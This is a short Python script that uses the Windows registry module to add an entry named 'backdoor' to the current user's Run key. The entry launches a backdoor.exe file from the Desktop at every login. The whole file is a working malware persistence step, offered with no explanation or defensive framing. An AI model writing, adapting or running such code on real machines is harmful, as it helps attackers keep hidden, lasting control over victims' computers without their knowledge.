import _winreg

serverKey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
                             'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                             0, _winreg.KEY_ALL_ACCESS)

_winreg.SetValueEx(serverKey, 'backdoor', 0, _winreg.REG_SZ, "C:\\Users\\usuario\\Desktop\\backdoor.exe")
_winreg.CloseKey(serverKey)